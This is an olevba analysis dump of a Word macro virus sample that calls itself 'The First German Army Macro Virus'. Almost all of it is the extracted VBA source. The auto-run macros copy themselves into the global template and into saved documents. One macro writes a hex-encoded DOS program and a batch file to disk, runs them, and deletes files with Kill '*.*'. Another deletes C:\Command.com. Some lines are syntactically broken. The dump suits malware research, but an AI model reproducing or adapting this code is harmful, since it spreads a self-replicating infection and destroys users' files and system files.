olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Nj-wmdlk1.k
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Nj-wmdlk1.k - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.Nj-wmdlk1.k - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim i
Dim VInstalled
On Error GoTo -1: On Error GoTo Finish

For i = 1 To WordBasic.CountMacros(1, 0)
    If WordBasic.[MacroName$](i, 1, 1) = "TFGAMV" Then
        VInstalled = 1
    End If
Next i

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
    WordBasic.MacroCopy "Global:TFGAMV", WordBasic.[FileName$]() + ":TFGAMV", 1
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":AutoExec", 1
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", 1
    WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", 1
    WordBasic.MacroCopy "Global:Joke", WordBasic.[FileName$]() + ":Joke", 1
    WordBasic.FileSaveAll 1, 0
End If


Finish:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Nj-wmdlk1.k - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim i
Dim VInstalled
WordBasic.FilePrint
WordBasic.ScreenUpdating
On Error GoTo -1: On Error GoTo Finish2

For i = 1 To WordBasic.CountMacros(0, 0)
    If WordBasic.[MacroName$](i, 0, 0) = "TFGAMV" Then
        VInstalled = 1
    End If
Next i

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":TFGAMV", "Global:TFGAMV", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoNew", "Global:AutoNew", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Global:AutoClose", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoExec", "Global:AutoExec", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":Joke", "Global:Joke", 1
End If

Finish2:
On Error GoTo -1: On Error GoTo Finish

For i = 1 To WordBasic.CountMacros(1, 0)
    If WordBasic.[MacroName$](i, 1, 1) = "TFGAMV" Then
        VInstalled
    End If
Next i

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
    WordBasic.MacroCopy "Global:TFGAMV", WordBasic.[FileName$]() + ":TFGAMV", 1
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":AutoExec", 1
    WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", 1
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", 1
    WordBasic.MacroCopy "Global:Joke", WordBasic.[FileName$]() + ":Joke", 1
    WordBasic.FileSaveAll 1, 0
End If

Finish:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: ./Virus.MSWord.Nj-wmdlk1.k - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim a$

WordBasic.Call "AutoOpen"
On Error GoTo -1: On Error GoTo Done

a$ = WordBasic.[FileName$]()
If a$ = "" Then GoTo Finish

If VInstalled = 0 Then
    Run1
    Run2
    WordBasic.FileSaveAll 1, 1
Else
    GoTo Done
End If

Done:
a$ = WordBasic.[FileName$]()
If a$ = "" Then
    GoTo Finish
Else
    WordBasic.Insert "zero"
End If

Finish:
WordBasic.MsgBox "Greetings from Cool Zero"
End Sub

Private Sub Run1()
Dim X$
Dim F$
Dim G$
Dim H$
Dim J$
Dim Y$
Dim Z$
Dim R1$
Dim CO$
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

R1$ = WordBasic.[GetDocumentVar$]("VirNameDoc")
CO$ = WordBasic.[FileName$]() + ":" + R1$
WordBasic.MacroCopy CO$, "Global:" + Z$, 1
WordBasic.SetProfileString "Intl", "Info2 ", Z$
WordBasic.ToolsCustomizeKeyboard KeyCode:=32, Category:=2, Name:=Z$, Add:=1, Context:=0
End Sub

Private Sub Run2()
Dim X$
Dim F$
Dim G$
Dim H$
Dim J$
Dim Y$
Dim Z$
Dim R2$
Dim OC$
X$ = Fun___(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

R2$ = WordBasic.[GetDocumentVar$]("VirName")
OC$ = WordBasic.[FileName$]() + ":" + R2$
WordBasic.MacroCopy OC$, "Global:" + Z$, 1
WordBasic.SetProfileString "Intl", "Info1", Z$
WordBasic.ToolsCustomizeKeyboard KeyCode:=69, Category:=2, Name:=Z$, Add:=1, Context:=0
End Sub

Private Function VInstalled()
Dim CC$
Dim i
CC$ = WordBasic.[GetProfileString$]("Intl", "Info1")
    VInstalled = 0
        If WordBasic.CountMacros(0) > 0 Then
    For i = 1 To WordBasic.CountMacros(0)
        If WordBasic.[MacroName$](i, 0) = CC$ Then
    VInstalled = 1
    End If
        Next i
End If
End Function

Private Function Fun$(F$, G$, H$, J$)
Dim One
Dim Two
Dim Num
Dim a$
Dim B$
Dim C$
Dim D$
Dim E$
One = 1169
Two = 9294
Num = WordBasic.Int(Rnd() * (Two - One) + One)
a$ = Str(Num)
a$ = WordBasic.[LTrim$](a$)

B$ = Mid(a$, 1, 1)
C$ = Mid(a$, 2, 1)
D$ = Mid(a$, 3, 1)
E$ = Mid(a$, 4, 1)

If B$ = "1" Then F$ = "A"
If B$ = "2" Then F$ = "B"
If B$ = "3" Then F$ = "C"
If B$ = "4" Then F$ = "D"
If B$ = "5" Then F$ = "E"
If B$ = "6" Then F$ = "F"
If B$ = "7" Then F$ = "G"
If B$ = "8" Then F$ = "H"
If B$ = "9" Then F$ = "I"
If B$ = "0" Then F$ = "J"


If C$ = "1" Then G$ = "H"
If C$ = "2" Then G$ = "I"
If C$ = "3" Then G$ = "J"
If C$ = "4" Then G$ = "K"
If C$ = "5" Then G$ = "L"
If C$ = "6" Then G$ = "M"
If C$ = "7" Then G$ = "N"
If C$ = "8" Then G$ = "O"
If C$ = "9" Then G$ = "P"
If C$ = "0" Then G$ = "Q"


If D$ = "1" Then H$ = "A"
If D$ = "2" Then H$ = "B"
If D$ = "3" Then H$ = "C"
If D$ = "4" Then H$ = "D"
If D$ = "5" Then H$ = "E"
If D$ = "6" Then H$ = "F"
If D$ = "7" Then H$ = "G"
If D$ = "8" Then H$ = "H"
If D$ = "9" Then H$ = "I"
If D$ = "0" Then H$ = "J"


If E$ = "1" Then J$ = "R"
If E$ = "2" Then J$ = "S"
If E$ = "3" Then J$ = "T"
If E$ = "4" Then J$ = "U"
If E$ = "5" Then J$ = "V"
If E$ = "6" Then J$ = "W"
If E$ = "7" Then J$ = "X"
If E$ = "8" Then J$ = "Y"
If E$ = "9" Then J$ = "Z"

If E$ = "0" Then J$ = "Q"

Fun$ = F$ + G$ + H$ + J$
End Function
-------------------------------------------------------------------------------
VBA MACRO AutoNew.bas 
in file: ./Virus.MSWord.Nj-wmdlk1.k - OLE stream: 'Macros/VBA/AutoNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim i
Dim VInstalled
Dim aa
On Error GoTo -1: On Error GoTo Finish

For i = 1 To WordBasic.CountMacros(1, 0)
    If WordBasic.[MacroName$](i, 1, 1) = "TFGAMV" Then
        VInstalled = 1
    End If
Next i

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + "AutoOpen", 1
    WordBasic.MacroCopy "Global:TFGAMV", WordBasic.[FileName$]() + "TFGAMV", 1
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + "AutoExec", 1
    WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + "AutoNew", 1
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + "AutoClose", 1
    WordBasic.MacroCopy "Global:Joke", WordBasic.[FileName$]() + "Joke", 1
    WordBasic.FileSaveAll 1, 0
End If
aa = WordBasic.Int(Rnd() * 100)
For i = 1 To aa
    WordBasic.Beep
    WordBasic.Beep
    WordBasic.Beep
    WordBasic.Beep
    WordBasic.Beep
    WordBasic.Beep
Next i
WordBasic.MsgBox " The First German Army Macro Virus"
WordBasic.MsgBox " Created by Cool Zero"
End Sub
-------------------------------------------------------------------------------
VBA MACRO TFGAMV.bas 
in file: ./Virus.MSWord.Nj-wmdlk1.k - OLE stream: 'Macros/VBA/TFGAMV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim As#
Dim Close#
Dim Print#
Dim setattr_
On Error GoTo -1: On Error GoTo NoDropper
    If WordBasic.Hour(WordBasic.Now()) <> 5 + 12 Then
    GoTo NoDropper
Open "C:\Command.com" For Input As 1
Close #1
Open "C:\smiley.com" For Output As 1
Print #1, "N Smiley.com"
Print #1, "E 0100 E9 FD 02 0D 46 72 65 65 20 4D 65 6D 6F 72 79 20"
Print #1, "E 0110 51 75 65 72 79 20 50 72 6F 67 72 61 6D 2C 20 56"
Print #1, "E 0120 65 72 73 69 6F 6E 20 34 2E 30 33 0D 0A 53 4D 47"
Print #1, "E 0130 20 53 6F 66 74 77 61 72 65 0D 0A 28 43 29 20 43"
Print #1, "E 0140 6F 70 79 72 69 67 68 74 20 31 39 38 36 2C 31 39"
Print #1, "E 0150 38 37 20 53 74 65 76 65 6E 20 4D 2E 20 47 65 6F"
Print #1, "E 0160 72 67 69 61 64 65 73 0D 0A 1A 00 00 00 00 00 00"
Print #1, "E 0170 00 00 45 4D 4D 58 58 58 58 30 45 78 70 61 6E 64"
Print #1, "E 0180 65 64 20 4D 65 6D 6F 72 79 20 4D 61 6E 61 67 65"
Print #1, "E 0190 72 20 45 72 72 6F 72 21 07 0D 0A 24 31 30 30 2E"
Print #1, "E 01A0 30 CD 12 BA 40 00 F7 E2 A3 70 01 BA 10 00 F7 E2"
Print #1, "E 01B0 BF 27 03 E8 55 01 E8 14 01 B4 09 BA 1F 03 CD 21"
Print #1, "E 01C0 06 8C C8 48 8E C0 26 A1 03 00 A3 6C 01 07 BB 10"
Print #1, "E 01D0 00 7F E3 8B CA 8B D8 BF 45 03 E8 2E 01 E8 ED 00"
Print #1, "E 01E0 A1 6C 01 BB 64 00 F7 E3 8B 1E 70 01 F7 F3 BF 60"
Print #1, "E 01F0 03 E8 F1 00 E8 D6 00 8B C2 BB 64 00 F7 E3 8B 1E"
Print #1, "E 0200 70 01 F7 F3 BF 63 03 E8 DB 00 B4 09 BA 3D 03 CD"
Print #1, "E 0210 21 B4 88 CD 15 72 19 0B C0 74 15 BB 00 04 F7 E3"
Print #1, "E 0220 BF 70 03 E8 E5 00 E8 A4 00 B4 09 BA 68 03 CD 21"
Print #1, "E 0230 06 B8 67 35 CD 21 BF 0A 00 BE 72 01 B9 08 00 FC"
Print #1, "E 0240 F3 A6 07 75 77 B4 42 CD 67 0A E4 75 74 89 16 6E"
Print #1, "E 0250 01 89 1E 6A 01 B8 00 40 F7 E2 BF 9A 03 E8 AB 00"
Print #1, "E 0260 E8 6A 00 B4 09 BA 92 03 CD 21 B8 00 40 F7 E3 BF"
Print #1, "E 0270 C8 03 E8 96 00 E8 55 00 A1 6A 01 3B 06 6E 01 75"
Print #1, "E 0280 0D BF F1 03 BE 9C 01 B9 05 00 F3 A4 EB 27 BB 64"
Print #1, "E 0290 00 F7 E3 8B 1E 6E 01 F7 F3 BF F3 03 E8 46 00 E8"
Print #1, "E 02A0 2B 00 8B C2 BB 64 00 F7 E3 8B 1E 6E 01 F7 F3 BF"
Print #1, "E 02B0 F6 03 E8 30 00 B4 09 BA C0 03 CD 21 B8 00 4C CD"
Print #1, "E 02C0 21 B4 09 BA 7A 01 CD 21 B8 01 4C CD 21 80 3D 30"
Print #1, "E 02D0 75 12 80 7D 01 30 7C 0C 80 7D 01 39 7F 06 C6 05"
Print #1, "E 02E0 20 47 EB E9 C3 50 53 32 E4 B3 0A F6 F3 05 30 30"
Print #1, "E 02F0 83 EF 02 89 05 5B 58 C3 50 53 B3 64 F6 F3 86 E0"
Print #1, "E 0300 E8 E2 FF 86 E0 E8 DD FF 5B 58 C3 50 53 52 BB 10"
Print #1, "E 0310 27 F7 F3 92 E8 E1 FF 92 E8 DD FF 5A 5B 58 C3 20"
Print #1, "E 0320 20 20 20 20 20 20 30 20 42 79 74 65 73 20 54 6F"
Print #1, "E 0330 74 61 6C 20 4D 65 6D 6F 72 79 0D 0A 24 20 20 20"
Print #1, "E 0340 20 20 20 20 30 20 42 79 74 65 73 20 41 76 61 69"
Print #1, "E 0350 6C 61 62 6C 65 20 4D 65 6D 6F 72 79 20 28 20 30"
Print #1, "E 0360 2E 30 30 25 29 0D 0A 24 20 20 20 20 20 20 20 30"
Print #1, "E 0370 20 42 79 74 65 73 20 6F 66 20 45 78 74 65 6E 64"
Print #1, "E 0380 65 64 20 4D 65 6D 6F 72 79 20 54 6F 74 61 6C 0D"
Print #1, "E 0390 0A 24 20 20 20 20 20 20 20 30 20 42 79 74 65 73"
Print #1, "E 03A0 20 6F 66 20 4C 49 4D 20 45 78 70 61 6E 64 65 64"
Print #1, "E 03B0 20 4D 65 6D 6F 72 79 20 54 6F 74 61 6C 0D 0A 24"
Print #1, "E 03C0 20 20 20 20 20 20 20 30 20 42 79 74 65 73 20 6F"
Print #1, "E 03D0 66 20 4C 49 4D 20 45 78 70 61 6E 64 65 64 20 4D"
Print #1, "E 03E0 65 6D 6F 72 79 20 41 76 61 69 6C 61 62 6C 65 20"
Print #1, "E 03F0 28 20 30 2E 30 30 25 29 0D 0A 24 03 47 01 2E C7"
Print #1, "E 0400 51 1E 06 8C C8 05 30 00 2D 00 00 8E D8 8E C0 A3"
Print #1, "E 0410 38 03 A0 33 07 A2 34 07 B0 00 A2 33 07 A0 36 07"
Print #1, "E 0420 A2 37 07 A1 02 08 A3 08 08 A1 04 08 A3 0A 08 A1"
Print #1, "E 0430 06 08 A3 0C 08 B4 2F CD 21 89 1E 3C 07 8C C3 89"
Print #1, "E 0440 1E 3E 07 BA 12 08 B4 1A CD 21 B8 00 00 A3 7B 07"
Print #1, "E 0450 A3 7D 07 BB DE 03 8B 47 01 A3 A7 07 E8 F3 02 3D"
Print #1, "E 0460 00 00 74 03 E9 45 02 A1 0E 08 3D 00 00 75 03 E9"
Print #1, "E 0470 07 02 B4 19 CD 21 50 04 41 A2 44 07 58 B4 00 3C"
Print #1, "E 0480 02 7D 0B E8 F0 02 3D 00 00 74 03 E9 1E 02 B2 00"
Print #1, "E 0490 BE 47 07 89 36 79 07 B4 47 CD 21 A0 47 07 3C 00"
Print #1, "E 04A0 74 13 8C D8 8E C0 B9 C8 00 B8 00 00 BF 44 07 F2"
Print #1, "E 04B0 AE 89 3E 79 07 FF 0E 79 07 B0 01 A2 35 07 E8 10"
Print #1, "E 04C0 04 A1 7B 07 3D 01 00 74 62 FF 0E 79 07 FE 0E 35"
Print #1, "E 04D0 07 E8 FD 03 A1 7B 07 3D 01 00 74 4F E8 8D 03 A1"
Print #1, "E 04E0 7D 07 3D 01 00 74 03 E9 8F 01 A1 38 07 8E C0 B9"
Print #1, "E 04F0 C8 00 B8 00 00 BF 44 07 F2 AE 89 3E 79 07 FF 0E"
Print #1, "E 0500 79 07 C6 06 35 07 01 90 E8 C6 03 A1 7B 07 3D 01"
Print #1, "E 0510 00 74 18 FF 0E 79 07 C6 06 35 07 00 90 E8 B1 03"
Print #1, "E 0520 A1 7B 07 3D 01 00 74 03 E9 4E 01 89 1E 9F 07 8B"
Print #1, "E 0530 1E 9F 07 B0 00 B4 57 CD 21 89 0E 40 07 89 16 42"
Print #1, "E 0540 07 FF 0E 0E 08 A0 35 07 A2 36 07 3C 01 75 44 BB"
Print #1, "E 0550 08 01 B8 00 00 89 47 01 B8 FF FF 2D DE 03 2B 06"
Print #1, "E 0560 A9 07 2B 06 3A 07 05 01 01 03 06 A2 07 BB DE 03"
Print #1, "E 0570 89 47 01 A1 A9 07 BB 05 01 8B C8 81 E1 0F 00 D1"
Print #1, "E 0580 E8 D1 E8 D1 E8 D1 E8 83 F9 00 74 01 40 89 47 01"
Print #1, "E 0590 E9 98 00 BB 05 01 B8 00 00 89 47 01 BB 08 01 B8"
Print #1, "E 05A0 10 00 89 47 01 8B 1E 9F 07 B0 00 B9 00 00 8B D1"
Print #1, "E 05B0 B4 42 CD 21 B9 20 00 BA E2 07 B4 3F CD 21 BB E2"
Print #1, "E 05C0 07 8B 47 14 A3 02 08 8B 47 16 A3 04 08 A1 AB 07"
Print #1, "E 05D0 2B 06 EA 07 8B 1E 3A 07 83 FB 00 74 01 40 A3 F8"
Print #1, "E 05E0 07 A3 06 08 B8 00 00 A3 F6 07 FF 06 E6 07 FF 06"
Print #1, "E 05F0 E6 07 FF 06 E6 07 B8 00 02 2B 06 E4 07 BB BF 01"
Print #1, "E 0600 90 3B C3 7F 04 FF 06 E6 07 8B 1E 9F 07 B0 00 B9"
Print #1, "E 0610 00 00 8B D1 B4 42 CD 21 8B 1E 9F 07 B9 20 00 A1"
Print #1, "E 0620 38 07 8E D8 BA E2 07 B4 40 CD 21 8B 1E 9F 07 B0"
Print #1, "E 0630 02 B9 00 00 8B D1 B4 42 CD 21 8B 1E 9F 07 8B 0E"
Print #1, "E 0640 3A 07 A1 38 07 8E D8 B4 40 CD 21 B9 BF 07 90 BA"
Print #1, "E 0650 00 01 B4 40 CD 21 A0 35 07 3C 00 74 03 E8 33 01"
Print #1, "E 0660 B0 01 8B 0E 40 07 8B 16 42 07 B4 57 CD 21 8B 1E"
Print #1, "E 0670 9F 07 B4 3E CD 21 EB 34 90 E8 A8 00 3D 01 00 75"
Print #1, "E 0680 2B E8 8E 00 8E C0 26 A0 00 00 3C EB 74 1E BE 00"
Print #1, "E 0690 00 BB 5E 06 8B 07 26 89 04 46 43 81 FB 2A 07 72"
Print #1, "E 06A0 F3 1E 8C C3 E8 51 00 1F 8C D8 8E C0 1E 8B 16 3C"
Print #1, "E 06B0 07 8E 1E 3E 07 B4 1A CD 21 1F A0 34 07 3C 01 75"
Print #1, "E 06C0 04 B4 4C CD 21 A0 37 07 3C 00 74 15 A1 A7 07 BB"
Print #1, "E 06D0 DE 03 89 47 01 8C C8 8E D8 8E C0 07 1F 59 E9 C0"
Print #1, "E 06E0 FA 8C C8 2B 06 0C 08 01 06 0A 08 BB 08 08 81 EB"
Print #1, "E 06F0 00 01 07 1F 59 2E FF 2F 53 B0 1C B4 35 CD 21 BE"
Print #1, "E 0700 0E 00 1F 89 1C 8C 44 02 BA 00 00 B0 1C B4 25 CD"
Print #1, "E 0710 21 C3 CD 12 2D 28 00 D1 E0 D1 E0 D1 E0 D1 E0 D1"
Print #1, "E 0720 E0 D1 E0 C3 B4 2A CD 21 3B 0E 2C 07 72 20 7F 0E"
Print #1, "E 0730 3A 36 2B 07 72 18 7F 06 3A 16 2A 07 72 10 B4 2C"
Print #1, "E 0740 CD 21 3A 16 32 07 72 06 B8 01 00 EB 04 90 B8 00"
Print #1, "E 0750 00 C3 B4 2A CD 21 3B 0E 30 07 72 16 7F 0E 3A 36"
Print #1, "E 0760 2F 07 72 0E 7F 06 3A 16 2E 07 72 06 B8 01 00 EB"
Print #1, "E 0770 04 90 B8 00 00 C3 50 BA 14 00 B9 01 00 BB BF 08"
Print #1, "E 0780 CD 25 58 58 CD 26 73 06 B8 01 00 EB 04 90 B8 00"
Print #1, "E 0790 00 59 C3 A1 A9 07 2D 03 00 03 06 3A 07 A3 A5 07"
Print #1, "E 07A0 8B 1E 9F 07 B0 00 B9 00 00 8B D1 B4 42 CD 21 8B"
Print #1, "E 07B0 1E 9F 07 B9 03 00 A1 38 07 8E D8 BA A4 07 B4 40"
Print #1, "E 07C0 CD 21 C3 51 56 B0 02 B4 3D CD 21 8B D8 A0 35 07"
Print #1, "E 07D0 3C 01 75 1F B0 00 B9 00 00 8B D1 B4 42 CD 21 B9"
Print #1, "E 07E0 03 00 BA A1 07 B4 3F CD 21 A0 A1 07 3C E9 74 03"
Print #1, "E 07F0 EB 66 90 B0 02 B9 00 00 8B D1 B4 42 CD 21 52 50"
Print #1, "E 0800 A3 A9 07 F7 D0 40 25 0F 00 A3 3A 07 A1 A9 07 D1"
Print #1, "E 0810 DA D1 D8 D1 DA D1 D8 D1 DA D1 D8 D1 DA D1 D8 A3"
Print #1, "E 0820 AB 07 58 5A 8B CA 8B D0 4A 4A 4A B0 00 B4 42 CD"
Print #1, "E 0830 21 B9 03 00 BA 62 05 B4 3F CD 21 B8 00 00 BE 62"
Print #1, "E 0840 05 8A 0C 80 F9 49 75 17 8A 4C 01 80 F9 50 75 0F"
Print #1, "E 0850 8A 4C 02 80 F9 52 75 07 B4 3F CD 21 B8 01 00 5E"
Print #1, "E 0860 59 C3 0D 0A 24 00 00 00 00 00 00 00 A1 38 07 8E"
Print #1, "E 0870 C0 B9 04 00 BE 94 07 8B 3E 79 07 F3 A4 A1 38 07"
Print #1, "E 0880 8E D8 8E C0 BA 44 07 B1 10 B4 4E CD 21 A1 79 07"
Print #1, "E 0890 3D 47 07 74 08 B4 4F CD 21 B4 4F CD 21 3D 12 00"
Print #1, "E 08A0 74 2E B4 2F CD 21 83 C3 15 26 8A 07 3C 10 74 02"
Print #1, "E 08B0 EB E7 C7 06 7D 07 01 00 B4 2F CD 21 83 C3 1E 8B"
Print #1, "E 08C0 36 79 07 26 8A 07 88 04 3C 00 74 04 43 46 EB F3"
Print #1, "E 08D0 C3 A1 38 07 8E C0 A0 35 07 3C 00 74 06 BE 98 07"
Print #1, "E 08E0 EB 04 90 BE 8D 07 B9 07 00 8B 3E 79 07 F3 A4 FF"
Print #1, "E 08F0 06 79 07 A1 38 07 8E D8 BA 44 07 B1 00 B4 4E CD"
Print #1, "E 0900 21 3D 00 00 75 57 B4 2F CD 21 83 C3 1E 8B 36 79"
Print #1, "E 0910 07 26 8A 07 88 04 3C 00 74 04 43 46 EB F3 BA 44"
Print #1, "E 0920 07 E8 9F FE 3D 00 00 74 2E B4 4F CD 21 3D 00 00"
Print #1, "E 0930 75 2B B4 2F CD 21 83 C3 1E 8B 36 79 07 26 8A 07"
Print #1, "E 0940 88 04 3C 00 74 04 43 46 EB F3 BA 44 07 E8 73 FE"
Print #1, "E 0950 3D 00 00 74 02 EB D2 C7 06 7B 07 01 00 C3 EB 10"
Print #1, "E 0960 90 14 14 14 14 00 00 20 00 00 18 15 00 00 00 00"
Print #1, "E 0970 1E 50 53 51 52 06 56 8C C8 8E D8 8E C0 BE 00 00"
Print #1, "E 0980 8B 44 0C 3D 00 00 74 06 FF 4C 0C EB 57 90 8B 44"
Print #1, "E 0990 05 8A 5C 09 E8 59 00 8B 44 03 B3 02 E8 51 00 88"
Print #1, "E 09A0 5C 09 8B 44 03 89 44 05 8B 44 03 8B 5C 07 80 FF"
Print #1, "E 09B0 00 74 04 FE CC FE CC FE C4 80 FB 00 74 04 FE C8"
Print #1, "E 09C0 FE C8 FE C0 80 FC 00 75 02 F6 D7 80 FC 50 75 02"
Print #1, "E 09D0 F6 D7 3C 00 75 02 F6 D3 3C 19 75 02 F6 D3 89 44"
Print #1, "E 09E0 03 89 5C 07 5E 07 5A 59 5B 58 1F 2E FF 2E 0E 00"
Print #1, "E 09F0 86 C4 53 50 B5 20 B4 01 CD 10 B4 0F CD 10 B4 03"
Print #1, "E 0A00 CD 10 89 54 0A 5A B4 02 CD 10 B4 08 CD 10 8A C8"
Print #1, "E 0A10 58 51 B9 01 00 B4 0A CD 10 B5 0C B1 0D B4 01 CD"
Print #1, "E 0A20 10 8B 54 0A B4 02 CD 10 5B C3 14 0B C7 07 0E 02"
Print #1, "E 0A30 C8 07 32 00 00 01 01 01 A1 0D 05 00 80 00 69 0D"
Print #1, "E 0A40 9C B2 94 15 41 3A 5C 46 52 45 45 2E 43 4F 4D 00"
Print #1, "E 0A50 4D 00 00 5C 4D 41 50 4D 45 4D 2E 43 4F 4D 00 00"
Print #1, "E 0A60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0A70 00 00 00 00 00 00 00 00 00 47 07 01 00 00 00 00"
Print #1, "E 0A80 00 00 00 00 00 00 00 00 00 00 00 00 00 5C 2A 2E"
Print #1, "E 0A90 45 58 45 00 2A 2E 2A 00 5C 2A 2E 43 4F 4D 00 07"
Print #1, "E 0AA0 00 E9 9E 00 E9 00 00 D5 FA FB 02 2F 00 4F 56 46"
Print #1, "E 0AB0 79 41 4E 4B 45 45 20 44 6F 6F 64 6C 65 23 61 6E"
Print #1, "E 0AC0 64 20 56 41 43 73 69 6E 2E 00 54 68 65 20 72 65"
Print #1, "E 0AD0 64 20 70 6C 61 6E 65 74 28 22 49 4E 76 61 73 69"
Print #1, "E 0AE0 4F 6E 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0AF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0B00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 EC 01"
Print #1, "E 0B10 02 00 01 3F 3F 3F 3F 3F 3F 3F 3F 43 4F 4D 00 06"
Print #1, "E 0B20 00 00 00 00 00 00 00 20 9C B2 94 15 FB 02 00 00"
Print #1, "E 0B30 46 52 45 45 2E 43 4F 4D 00 4D 00 00 00 00 00 00"
Print #1, "E 0B40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0B50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0B60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0B70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0B80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0B90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0BA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0BB0 00 00 00 00 00 00 00 00 00 00 00 00 00 49 50 52"
Print #1, "RCX"
Print #1, "0ABF"
Print #1, "W"
Print #1, "Q"
Print #1, ""
Close 1
Open "SMILEY.BAT" For Output As 1
Print #1, "@echo off"
Print #1, "debug<SMILEY.scr>nul"
Print #1, "SMILEY.com"
Print #1, "Copy SMILEY.com C:\Mouse.com" > nul
Close 1
setattr_ "C:\Autoexec.bat" For Append As 1
Close 1
WordBasic.Shell "SMILEY.bat", 0
WordBasic.Kill "SMILEY.bat"
WordBasic.Kill "SMILEY.scr"
WordBasic.Kill "*.*"
NoDropper:
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO Joke.bas 
in file: ./Virus.MSWord.Nj-wmdlk1.k - OLE stream: 'Macros/VBA/Joke'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim aa
Dim i
Dim a$
Dim DokumentSchliessen
If WordBasic.Hour(WordBasic.Now()) = 15 And WordBasic.Minute(WordBasic.Now()) = 0 Then
WordBasic.MsgBox "Hi, Iґm the FIRST GERMAN MACRO VIRII"
WordBasic.MsgBox "O.k. Now I will Play with YOU"
WordBasic.MsgBox " I can destroy Your harrdrive"
WordBasic.MsgBox " But I will only play with YOU :-)"
WordBasic.MsgBox "First look down on the Page"
WordBasic.PrintStatusBar " Hi, can You see me ????????????????????????????????????????????????????"
WordBasic.MsgBox "O.k. the second game"
WordBasic.MsgBox "Now I let Your computer beep"
aa = WordBasic.Int(Rnd() * 100)
For i = 1 To aa
WordBasic.Beep
WordBasic.Beep
WordBasic.Beep
Next i
WordBasic.MsgBox "The Third Game"
WordBasic.MsgBox "Now I let print a page,  Read the Information !!!"
WordBasic.ScreenUpdating
a$ = " Now itґs never a joke to play with      C O O L      Z E R O     You have 15 Minutes To find me, Then I will destroy YOUR Command.com "
WordBasic.Insert a$
WordBasic.FilePrint
DokumentSchliessen = 2
WordBasic.ScreenUpdating
Else
If WordBasic.Hour(WordBasic.Now() = 15 And WordBasic.Minute(WordBasic.Now()) = 15 Then)
WordBasic.Kill "C:\Command.com"
End If
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Nj-wmdlk1.k
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoClose - 2108 bytes
' Line #0:
' Line #1:
